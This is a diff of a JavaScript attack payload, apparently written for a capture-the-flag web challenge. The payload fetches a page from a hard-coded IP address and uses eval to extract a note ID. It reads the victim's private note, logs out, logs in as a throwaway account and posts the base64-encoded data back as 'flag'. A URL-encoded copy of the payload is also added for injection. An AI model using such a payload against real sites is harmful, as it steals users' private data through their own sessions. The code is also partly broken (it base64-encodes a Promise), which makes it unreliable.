@@ -1,7 +1,9 @@
-fetch("http://211.239.124.243:18603/?").then(x=>x.text()).then(x=>eval("x.substring(x.indexOf('/read?id=')+9,x.indexOf('/read?id=')+73)")).then(x=>fetch("http://211.239.124.243:18603/read/"+x+"?").then(a=>a.text()).then(a=>eval(JSON.stringify(a))));
+data=fetch("http://211.239.124.243:18603/?").then(x=>x.text()).then(x=>eval("x.substring(x.indexOf('/read?id=')+9,x.indexOf('/read?id=')+73)")).then(x=>fetch("http://211.239.124.243:18603/read/"+x+"?").then(a=>a.text()).then(a=>JSON.stringify(a)).then(a=>btoa(a)));
 for(i=0;i<10000000;i++){}
 fetch("http://211.239.124.243:18603/logout?");
-for(i=0;i<10000000000;i++){}
+for(i=0;i<10000000;i++){}
 fetch("http://211.239.124.243:18603/login?",{body:"username=sdfsadfasdfasfd&password=sdfsadfasdfasfd",headers:{"Content-Type":"application/x-www-form-urlencoded"},method:"post",});
 for(i=0;i<10000000;i++){}
 fetch("http://211.239.124.243:18603/write?",{body:"title=flag&content="+btoa(data),headers:{"Content-Type":"application/x-www-form-urlencoded"},method:"post",});
+
+data%3Dfetch%28%22http%3A%2F%2F211.239.124.243%3A18603%2F%3F%22%29.then%28x%3D%3Ex.text%28%29%29.then%28x%3D%3Eeval%28%22x.substring%28x.indexOf%28%27%2Fread%3Fid%3D%27%29%252b9%2Cx.indexOf%28%27%2Fread%3Fid%3D%27%29%252b73%29%22%29%29.then%28x%3D%3Efetch%28%22http%3A%2F%2F211.239.124.243%3A18603%2Fread%2F%22%252bx%252b%22%3F%22%29.then%28a%3D%3Ea.text%28%29%29.then%28a%3D%3EJSON.stringify%28a%29%29.then%28a%3D%3Ebtoa%28a%29%29%29%3B%0Afor%28i%3D0%3Bi%3C10000000%3Bi%252b%252b%29%7B%7D%0Afetch%28%22http%3A%2F%2F211.239.124.243%3A18603%2Flogout%3F%22%29%3B%0Afor%28i%3D0%3Bi%3C10000000%3Bi%252b%252b%29%7B%7D%0Afetch%28%22http%3A%2F%2F211.239.124.243%3A18603%2Flogin%3F%22%2C%7Bbody%3A%22username%3Dsdfsadfasdfasfd%26password%3Dsdfsadfasdfasfd%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fx-www-form-urlencoded%22%7D%2Cmethod%3A%22post%22%2C%7D%29%3B%0Afor%28i%3D0%3Bi%3C10000000%3Bi%252b%252b%29%7B%7D%0Afetch%28%22http%3A%2F%2F211.239.124.243%3A18603%2Fwrite%3F%22%2C%7Bbody%3A%22title%3Dflag%26content%3D%22%252bbtoa%28data%29%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fx-www-form-urlencoded%22%7D%2Cmethod%3A%22post%22%2C%7D%29%3B%0A
